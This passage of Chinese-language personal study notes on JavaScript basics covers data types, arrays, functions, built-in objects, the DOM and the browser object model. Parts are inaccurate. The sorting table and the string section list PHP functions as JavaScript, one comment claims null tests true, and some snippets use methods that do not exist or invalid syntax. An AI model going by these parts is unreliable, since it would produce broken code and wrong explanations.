class="line"><span class="comment">// 不用 var 也可直接赋值</span></span><br><span class="line">up = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let允许你声明一个作用域被限制在块级中的变量、语句或者表达式。在Function中局部变量推荐使用let变量，避免变量名冲突。</span></span><br><span class="line"><span class="comment">// 属于定义了同一个x</span></span><br><span class="line"><span class="keyword">function</span> func&#123; </span><br><span class="line">    <span class="keyword">var</span> x; </span><br><span class="line">    <span class="keyword">if</span>&#123; <span class="keyword">var</span> x;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 属于定义了不同的x</span></span><br><span class="line"><span class="keyword">function</span> func&#123;</span><br><span class="line">    <span class="keyword">let</span> x; </span><br><span class="line">    <span class="keyword">if</span>&#123; <span class="keyword">let</span> x;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// todo</span></span><br><span class="line"><span class="keyword">const</span></span><br></pre></td></tr></table></figure><h3 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4 数据类型"></a>4 数据类型</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据类型</span></span><br><span class="line"><span class="comment">// 值</span></span><br><span class="line"><span class="title class_">Number</span> <span class="comment">//所有数字是浮点存储，但整型浮点会自动转化成整型</span></span><br><span class="line"><span class="title class_">String</span></span><br><span class="line"><span class="title class_">Boolean</span></span><br><span class="line"><span class="literal">undefined</span> <span class="comment">//function中未传参参为undefined，无返回值返回undefined</span></span><br><span class="line"><span class="literal">null</span> <span class="comment">//typeof测试object字符串返回值，undefined与null等值，bool测试为true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用</span></span><br><span class="line"><span class="attr">object</span>:</span><br><span class="line">    object <span class="comment">//类字典</span></span><br><span class="line">    array</span><br><span class="line">    <span class="keyword">function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// typeof使用</span></span><br><span class="line"><span class="keyword">typeof</span> var_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否是数字</span></span><br><span class="line"><span class="built_in">isNaN</span>(num);</span><br><span class="line"><span class="comment">// 将字符串转化为整形，从头开始判断直到不为数字，首字符不为则直接返回 NaN</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"><span class="comment">// 将字符串转化为浮点型，从头开始判断直到不为浮点规则（如22.33.4 = 22.33），首字符不为则直接返回 NaN</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;str&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字转字符串，null 和 undefined 不能转</span></span><br><span class="line">int/float.<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// 保留 num 位小数</span></span><br><span class="line">int/float.<span class="title function_">toFixed</span>( num );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造数字，布尔，字符串</span></span><br><span class="line"><span class="title class_">Number</span>();</span><br><span class="line"><span class="title class_">Boolean</span>();</span><br><span class="line"><span class="title class_">String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得值</span></span><br><span class="line">variable.<span class="title function_">value</span>();</span><br><span class="line">label_name[.<span class="property">label_name</span>].<span class="title function_">value</span>();</span><br></pre></td></tr></table></figure><h3 id="5-运算符"><a href="#5-运算符" class="headerlink" title="5 运算符"></a>5 运算符</h3><blockquote><p>同C语言。</p><p>不同：</p><p>\==：判断相等，比较值<br>===：判断全等，比较值和类型</p></blockquote><h3 id="6-选择语句"><a href="#6-选择语句" class="headerlink" title="6 选择语句"></a>6 选择语句</h3><blockquote><p>if 同 C语言。</p><p>switch 同C语言。</p></blockquote><h3 id="7-循环语句"><a href="#7-循环语句" class="headerlink" title="7 循环语句"></a>7 循环语句</h3><blockquote><p>while同C语言。</p><p>do…while同C语言。</p><p>for同C语言。</p></blockquote><hr><h2 id="三、数组"><a href="#三、数组" class="headerlink" title="三、数组"></a>三、数组</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//同 python 的 list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//隐式创建</span></span><br><span class="line"><span class="keyword">var</span> arr = [value_1,value_2,value_ <span class="number">3</span>];</span><br><span class="line"><span class="comment">//直接实例化</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(value_1,value_2,value_3);   </span><br><span class="line"><span class="comment">//创建数组并指定长度</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得 / 设置长度</span></span><br><span class="line">arr.<span class="property">length</span>;</span><br><span class="line"><span class="comment">//索引获取 / 设置，不会越界，越界返回 undefined</span></span><br><span class="line">arr[num];</span><br><span class="line"><span class="comment">//设置属性，key:value，会新增属性，不会改变数组长度</span></span><br><span class="line">arr[key];</span><br></pre></td></tr></table></figure><h3 id="2-数组遍历"><a href="#2-数组遍历" class="headerlink" title="2 数组遍历"></a>2 数组遍历</h3><ul><li><p>数组在使用的时候建议大家规矩来用。在存放数据时，从下标0开始顺序的存放数组元素。如果下标：</p><ol><li>为非负整数(包括整数字符串)︰自动从0开始，不存在添加undefined。</li><li>为负数、小数、非数字符串：这些内容不计算在长度内，当成”属性”处理，相当于自定义属性。</li></ol></li><li><p>数组非常灵活，使用数组元素</p><ol><li><p>index：非负整数（包括整数字符串）</p><p><code>arr.index</code></p><p><code>arr[ index ]</code></p></li><li><p>index：负数、小数、非数字字符串</p><p><code>arr[ key ]</code></p></li></ol></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//for --&gt;不遍历属性</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++) &#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//for in --&gt;不遍历索引中的 undefined</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> index <span class="keyword">in</span> arr) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//foreach --&gt;不遍历属性和索引中的 undefined</span></span><br><span class="line"><span class="comment">//完全一致，无需该函数元素索引名</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">element,index</span>) &#123;&#125;</span><br><span class="line">arr.<span class="title function_">foreach</span>(<span class="params">func( element,index)</span>) &#123;&#125;     </span><br></pre></td></tr></table></figure><h3 id="3-排序函数"><a href="#3-排序函数" class="headerlink" title="3 排序函数"></a>3 排序函数</h3><div class="table-container"><table><thead><tr><th>函数</th><th>排序依据</th><th>排序规则</th><th>”键值对“是否改变</th></tr></thead><tbody><tr><td>sort()</td><td>元素值</td><td>升序</td><td>是</td></tr><tr><td>rsort()</td><td>元素值</td><td>降序</td><td>是</td></tr><tr><td>asort()</td><td>元素值</td><td>升序</td><td>否</td></tr><tr><td>arort()</td><td>元素值</td><td>降序</td><td>否</td></tr><tr><td>ksort()</td><td>索引值</td><td>升序</td><td>否</td></tr><tr><td>krsort()</td><td>索引值</td><td>降序</td><td>否</td></tr><tr><td>natsort()</td><td>元素值</td><td>升序</td><td>否</td></tr><tr><td>natcasesort()</td><td>元素值</td><td>升序</td><td>否</td></tr><tr><td>shuffle()</td><td>元素值</td><td>随机乱序</td><td>是</td></tr></tbody></table></div><hr><h2 id="四、函数"><a href="#四、函数" class="headerlink" title="四、函数"></a>四、函数</h2><h3 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1 定义"></a>1 定义</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数声明语句</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">name</span> ( [ value ] ) &#123;&#125;;</span><br><span class="line"><span class="comment">// 函数定义表达式，匿名函数，将函数赋给一个变量</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="keyword">function</span>(<span class="params"> [ value ] </span>)&#123;&#125;;</span><br><span class="line"><span class="comment">// Function构造函数，前面任意多的value是参数，最后一个参数是函数主体</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="keyword">new</span> <span class="title class_">Function</span>( value );</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> add = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27; return ( x + y)&#x27;</span>);</span><br><span class="line"><span class="comment">// 等于下面语句</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span> (x,y) &#123;<span class="keyword">return</span> (x + y);&#125;</span><br></pre></td></tr></table></figure><h3 id="2-特点"><a href="#2-特点" class="headerlink" title="2 特点"></a>2 特点</h3><ol><li>使用函数声明语句声明函数具有函数名提升的效果。</li><li>JS没有函数重载，新定义的同名函数会覆盖原函数。</li></ol><ul><li><p>参数</p><blockquote><p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数，定义时的参数称为形参，调用时的参数称为实参。</p></blockquote><ol><li>实参可以省略，那么对应形参为undefined。</li><li>若函数形参同名（一般不会这么干)︰在使用时以最后一个值为准。</li><li>可以给参数默认值：当参数为特殊值时，可以赋予默认值。</li><li>参数为值传递，传递副本；引用传递时传递地址，操作的是同一个对象。</li></ol></li><li><p>变量</p><blockquote><p>函数外全局变量，函数内局部变量。</p></blockquote><ol><li>同名：同名不影响。</li><li>函数内不加 var 修饰符则为全局变量。</li></ol></li></ul><h3 id="3-计时函数"><a href="#3-计时函数" class="headerlink" title="3 计时函数"></a>3 计时函数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 间隔指定的毫秒数不停地执行指定的代码（重复执行）。</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="string">&quot;fun()&quot;</span>,delay);</span><br><span class="line"><span class="comment">// 在指定的毫秒数后执行指定代码（一次性执行）。</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;fun()&quot;</span>,delay);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止 setInterval() 方法执行的函数代码。</span></span><br><span class="line"><span class="built_in">clearInterval</span>(index);</span><br><span class="line"><span class="comment">// 停止 setTimeOut() 方法执行的函数代码。</span></span><br><span class="line"><span class="built_in">clearTimeout</span>(index);</span><br></pre></td></tr></table></figure><hr><h2 id="五、对象"><a href="#五、对象" class="headerlink" title="五、对象"></a>五、对象</h2><blockquote><p>自定义对象前的对象为内置对象。</p></blockquote><h3 id="1-with"><a href="#1-with" class="headerlink" title="1 with"></a>1 with</h3><ul><li><p>使用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// with语句中的变量都会默认指向with后面所包含的对象。</span></span><br><span class="line">&lt;form name=<span class="string">&quot;myform&quot;</span>&gt;&lt;/form&gt;</span><br><span class="line"><span class="title function_">with</span>(<span class="params"><span class="variable language_">document</span>.myform</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> username = username.<span class="property">value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-String"><a href="#2-String" class="headerlink" title="2 String"></a>2 String</h3><blockquote><p>字符串对象</p></blockquote><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回字符串的长度</span></span><br><span class="line">str.<span class="property">length</span></span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回指定位置处的字符，也可以直接用索引获得。</span></span><br><span class="line">str.<span class="title function_">charAt</span>(idx);</span><br><span class="line"><span class="comment">// 返回指定子字符串的位置，从左到右。找不到返回-1(起始位置)。</span></span><br><span class="line">str.<span class="title function_">indexOf</span>(chr,start);</span><br><span class="line"><span class="comment">// 反向检索</span></span><br><span class="line"><span class="title function_">lastIndexOf</span>(chr,start);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在字符串中用一些字符替换另一些字符</span></span><br><span class="line"><span class="title function_">replace</span>(regexp/substr,replacement);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把一个字符串分割成字符串数组（同py）</span></span><br><span class="line"><span class="title function_">split</span>(separator,limit);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回给定字符串中从m位置开始，取n个字符，如果参数n省略，则意味着取到字符串末尾。</span></span><br><span class="line">str.<span class="title function_">substr</span>(m,n);</span><br><span class="line"><span class="comment">// 返回给定字符串中从m位置开始，到n位置结束，如果参数n省略，则意味着取到字符串末尾。</span></span><br><span class="line">str.<span class="title function_">substring</span>(m, n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串中的字符全部转化成小写。</span></span><br><span class="line">str.<span class="title function_">toLowerCase</span>();</span><br><span class="line"><span class="comment">// 将字符串中的字符全部转化成大写。</span></span><br><span class="line">str.<span class="title function_">toUpperCase</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// /n转&lt;br /&gt;</span></span><br><span class="line"><span class="title function_">nl2br</span>(string);</span><br><span class="line"><span class="comment">// 除去字符串中的HTML、XML、PHP标记</span></span><br><span class="line"><span class="title function_">strip_tags</span>(string,[allow]);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Math"><a href="#3-Math" class="headerlink" title="3 Math"></a>3 Math</h3><blockquote><p>数学对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 随机数，0-1</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line"><span class="comment">// 向上取整</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">ceil</span>(value);</span><br><span class="line"><span class="comment">// 向下取整</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(value);</span><br><span class="line"><span class="comment">// 四舍五入</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">round</span>(value);</span><br><span class="line"><span class="comment">// 最大最小</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">max</span>(value_1,value_2);</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">min</span>(value_1,value_2);</span><br></pre></td></tr></table></figure><h3 id="4-Date"><a href="#4-Date" class="headerlink" title="4 Date"></a>4 Date</h3><blockquote><p>日期对象</p><p><a href="https://blog.csdn.net/kelly0721/article/details/112005664">toLocaleString()</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// B端时间。</span></span><br><span class="line"><span class="comment">// 通过new方法创建日期对象</span></span><br><span class="line"><span class="keyword">var</span> mydate=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="comment">// 获取日期（年月日时分秒）</span></span><br><span class="line"><span class="title function_">getFullYear</span>();</span><br><span class="line"><span class="title function_">getMonth</span>();</span><br><span class="line"><span class="title function_">getDate</span>();</span><br><span class="line"><span class="title function_">getHours</span>();</span><br><span class="line"><span class="title function_">getMinutes</span>();</span><br><span class="line"><span class="title function_">getseconds</span>();</span><br><span class="line"><span class="comment">// 设置日期</span></span><br><span class="line"><span class="title function_">setYear</span>();</span><br><span class="line"><span class="title function_">setMonth</span>();</span><br><span class="line"><span class="title function_">setDate</span>();</span><br><span class="line"><span class="title function_">setHours</span>();</span><br><span class="line"><span class="title function_">setMinutes</span>();</span><br><span class="line"><span class="title function_">setSeconds</span>();</span><br><span class="line"><span class="comment">// 数字转换为本地格式表示的字符串</span></span><br><span class="line"><span class="title function_">toLoacaleString</span>();</span><br></pre></td></tr></table></figure><ul><li>转换成本地时间字符串说明<ol><li>getMonth()：得到值：0~11 (1月~12月)</li><li>setMonth()：设置值：0~11</li><li>toLocaleString()：可根据本地时间把 Date 对象转换为字符串，并返回结果。</li></ol></li></ul><h3 id="5-Array"><a href="#5-Array" class="headerlink" title="5 Array"></a>5 Array</h3><blockquote><p>数组对象</p><p><a href="https://blog.csdn.net/m0_37885651/article/details/80016718">sortby</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加元素到最后</span></span><br><span class="line">arr.<span class="title function_">push</span>(value);</span><br><span class="line"><span class="comment">// 添加元素到最前</span></span><br><span class="line">arr.<span class="title function_">unshift</span>(value);</span><br><span class="line"><span class="comment">// 删除最后一项</span></span><br><span class="line">arr.<span class="title function_">pop</span>();</span><br><span class="line"><span class="comment">// 删除第一项</span></span><br><span class="line">arr.<span class="title function_">shift</span>();</span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line"><span class="keyword">delete</span> arr[index];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组排序</span></span><br><span class="line">arr.<span class="title function_">sort</span>(sortby);</span><br><span class="line"><span class="comment">// sortby（升序，b-a是降序，原理同C）</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params">a,b</span>)&#123;<span class="keyword">return</span> a-b&#125;;</span><br><span class="line"><span class="comment">// 数组翻转</span></span><br><span class="line">arr.<span class="title function_">reverse</span>();</span><br><span class="line"><span class="comment">// 数组转成字符串，以value分割</span></span><br><span class="line">arr.<span class="title function_">join</span>([value]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素索引</span></span><br><span class="line">arr.<span class="title function_">indexOf</span>(value);</span><br><span class="line"><span class="comment">// 截取(切片)数组，原数组不发生变化，[ start , end )</span></span><br><span class="line">arr.<span class="title function_">slice</span>(start,end);</span><br><span class="line"><span class="comment">// 剪接数组，原数组变化，从start开始切num出来，再新增元素add_1等</span></span><br><span class="line">arr.<span class="title function_">splice</span>(start,num,[add_1 , add_2 , ...]);</span><br><span class="line"><span class="comment">// 数组合并</span></span><br><span class="line">arr.<span class="title function_">concat</span>(new_arr);</span><br></pre></td></tr></table></figure><h3 id="6-Arguments"><a href="#6-Arguments" class="headerlink" title="6 Arguments"></a>6 Arguments</h3><blockquote><p>只在函数内定义，保存了函数的实参。</p></blockquote><h3 id="7-document"><a href="#7-document" class="headerlink" title="7 document"></a>7 document</h3><blockquote><p>通过javascript来操作DOM元素</p></blockquote><ul><li><p>获取DOM属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从上到下依ID获得DOM（加s获得数组）</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(id);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Name获得，edge 12以上支持</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 依html获得，只有这个函数可以操作动态的dom</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(tag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类名获得，ie9以上支持</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="keyword">class</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSS选择器获得，ie8部分支持，ie9及以上支持。</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(选择器);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(选择器);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象值</span></span><br><span class="line">dom.<span class="property">innerHTML</span>;</span><br><span class="line">dom.<span class="property">innerText</span>;</span><br></pre></td></tr></table></figure></li><li><p>操作DOM属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象属性</span></span><br><span class="line"><span class="comment">// 此种方法无法获取自定义属性</span></span><br><span class="line">dom.<span class="property">html_attr</span>=<span class="string">&#x27;值&#x27;</span>;</span><br><span class="line"><span class="comment">// 这种方法可以改变元素的css类，从而调整外观</span></span><br><span class="line">dom.<span class="property">class_Name</span>=<span class="string">&#x27;类名&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象方法</span></span><br><span class="line"><span class="comment">// 获取指定dom元素的attr属性，可以获取自定义属性</span></span><br><span class="line">dom.<span class="title function_">getAttribute</span>(<span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="comment">// 设置指定dom元素attr属性的值</span></span><br><span class="line">dom.<span class="title function_">setAttribute</span>(<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;值&#x27;</span>)</span><br><span class="line"><span class="comment">// 删除指定dom元素的attr属性</span></span><br><span class="line">dom.<span class="title function_">removeAttribute</span>(<span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="comment">// 判断指定dom元素是否含有attr属性</span></span><br><span class="line">dom.<span class="title function_">hasAttribute</span>(<span class="string">&#x27;attr&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>操作CSS属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取CSS属性值</span></span><br><span class="line"><span class="comment">// 注意css属性的驼峰写法，background-color应写成backgroundColor</span></span><br><span class="line"><span class="comment">// obj.style.attr的方式只能获取css行内属性，而不能获取其他方式的css属性，所以应该用getComputedStyle方法来获取完整的css属性</span></span><br><span class="line"><span class="title function_">getComputedStyle</span>(dom).<span class="property">property</span>;</span><br><span class="line"><span class="title function_">getComputedStyle</span>(dom)[<span class="string">&#x27;property&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置CSS属性值</span></span><br><span class="line"><span class="comment">// 此方法只能设置行内样式，一次只能设置一个css属性</span></span><br><span class="line">dom.<span class="property">style</span>.<span class="property">property</span>=<span class="string">&#x27;new style&#x27;</span>;</span><br><span class="line"><span class="comment">// 一次可以设置多个属性。实际应用中更倾向与使用dom元素.className=&#x27;类名&#x27;，这个方法来改变元素的多个属性</span></span><br><span class="line">dom.<span class="property">style</span>.<span class="property">cssText</span>=<span class="string">&quot;style&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p>DOM遍历</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父节点</span></span><br><span class="line">dom.<span class="property">parentNode</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子节点</span></span><br><span class="line"><span class="comment">// 获取所有子节点，包括元素节点和文本节点</span></span><br><span class="line">dom.<span class="property">childNodes</span>;</span><br><span class="line"><span class="comment">// 获取所有元素节点，不包括文本节点</span></span><br><span class="line">dom.<span class="property">children</span>;</span><br><span class="line"><span class="comment">// 第一个子节点，包括元素节点和文本节点</span></span><br><span class="line">dom.<span class="property">firstChild</span>;</span><br><span class="line"><span class="comment">// 第一个元素节点</span></span><br><span class="line">dom.<span class="property">firstElementChild</span>;</span><br><span class="line"><span class="comment">// 最后一个子节点，包括元素节点和文本节点</span></span><br><span class="line">dom.<span class="property">lastChild</span>;</span><br><span class="line"><span class="comment">// 最后一个元素节点</span></span><br><span class="line">dom.<span class="property">lastElementChild</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：使用childNodes、firstChild、lastChild来操作元素节点非常麻烦，因为它们把文本节点（一般是空白节点）包括进来了，Javascript为了让我们可以快速开发，提供了新的方法，也就是只针对元素节点的操作属性，children、firstElementChild、lastElementChild。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 兄弟节点</span></span><br><span class="line"><span class="comment">// 前后一个兄弟节点，包括文本节点和元素节点。</span></span><br><span class="line">dom.<span class="property">previousSibling</span>;</span><br><span class="line">dom.<span class="property">nextSibling</span>;</span><br><span class="line"><span class="comment">// 前后一个元素节点</span></span><br><span class="line">dom.<span class="property">previousElementSibling</span>;</span><br><span class="line">dom.<span class="property">nextElementSibling</span>;</span><br></pre></td></tr></table></figure></li><li><p>动态DOM</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 要创建一个元素需要以下四步</span></span><br><span class="line"><span class="comment">// 1.创建元素节点</span></span><br><span class="line"><span class="title function_">createElement</span>(<span class="string">&#x27;html_label&#x27;</span>);</span><br><span class="line"><span class="comment">// 2.创建文本节点</span></span><br><span class="line"><span class="title function_">createTextNode</span>(<span class="string">&#x27;text_content&#x27;</span>);</span><br><span class="line"><span class="comment">// 3.把文本节点插入元素节点</span></span><br><span class="line">parent.<span class="title function_">appendChild</span>(B);</span><br><span class="line">parent.<span class="title function_">appendChild</span>(B,ref); <span class="comment">//插在ref前</span></span><br><span class="line"><span class="comment">// 4.把组装好的元素插入到已有元素中</span></span><br><span class="line"><span class="title function_">appendChild</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line">dom.<span class="title function_">removeChild</span>(B);</span><br><span class="line"><span class="comment">// 克隆</span></span><br><span class="line">dom.<span class="title function_">cloneNode</span>(bool);</span><br><span class="line"><span class="comment">// 替换</span></span><br><span class="line">dom.<span class="title function_">replaceChild</span>(<span class="keyword">new</span>,old);</span><br></pre></td></tr></table></figure></li></ul><h3 id="8-自定义对象"><a href="#8-自定义对象" class="headerlink" title="8 自定义对象"></a>8 自定义对象</h3><ul><li><p>创建对象</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字面量形式创建对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;; <span class="comment">//空对象</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123; key : value , key : value , ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过 new Object对象创建：</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">//空对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过 Object 对象的 create 方法创建</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>( <span class="literal">null</span> ); <span class="comment">//空对象</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>( other_obj ); <span class="comment">//继承别的对象</span></span><br></pre></td></tr></table></figure></li><li><p>对象操作</p><ul><li>赋值：<code>obj.key=value;</code></li></ul></li><li><p>this</p><ul><li>函数中使用：调用windows对象，相当于定义在全局对象上的属性。</li><li>对象中使用：调用本对象的属性。</li></ul></li></ul><h3 id="9-序列化与反序列化"><a href="#9-序列化与反序列化" class="headerlink" title="9 序列化与反序列化"></a>9 序列化与反序列化</h3><ul><li><p>序列操作</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//序列化对象，将对象转化为字符串</span></span><br><span class="line"><span class="title class_">JSON</span>.<span class="title function_">stringify</span>( obj );</span><br><span class="line"><span class="comment">//反序列化，将Json字符串转化为对象</span></span><br><span class="line"><span class="title class_">JSON</span>.<span class="title function_">parse</span>( jsonStr );</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="六、BOM"><a href="#六、BOM" class="headerlink" title="六、BOM"></a>六、BOM</h2><blockquote><p>浏览器对象模型。</p></blockquote><h3 id="1-window"><a href="#1-window" class="headerlink" title="1 window"></a>1 window</h3><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 表示浏览器窗口的内部大小（包括滚动条）</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerHeight</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">innerWidth</span></span><br></pre></td></tr></table></figure></li><li><p>方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打开新窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(url)</span><br><span class="line"><span class="comment">// 关闭当前窗口</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">close</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">//滚动x,y </span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollBy</span>( x , y )</span><br><span class="line"><span class="comment">//滚动到x,y处</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>( x , y )</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向下滚动一页面高度</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>,<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-screen"><a href="#2-screen" class="headerlink" title="2 screen"></a>2 screen</h3><blockquote><p>浏览器窗口。</p></blockquote><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可用的屏幕宽度</span></span><br><span class="line">screen.<span class="property">availWidth</span></span><br><span class="line"><span class="comment">// 可用的屏幕高度（可用高度，减去任务栏）</span></span><br><span class="line">screen.<span class="property">availHeight</span></span><br></pre></td></tr></table></figure></li><li><p>方法</p></li></ul><h3 id="3-location"><a href="#3-location" class="headerlink" title="3 location"></a>3 location</h3><blockquote><p>地址栏对象。</p></blockquote><ul><li><p>属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前页面的url</span></span><br><span class="line">location.<span class="property">href</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-history"><a href="#4-history" class="headerlink" title="4 history"></a>4 history</h3><blockquote><p>浏览器历史对象。</p></blockquote><ul><li><p>属性</p></li><li><p>方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 与在浏览器中点击向前按钮相同</span></span><br><span class="line">history.<span class="title function_">forward</span>()</span><br><span 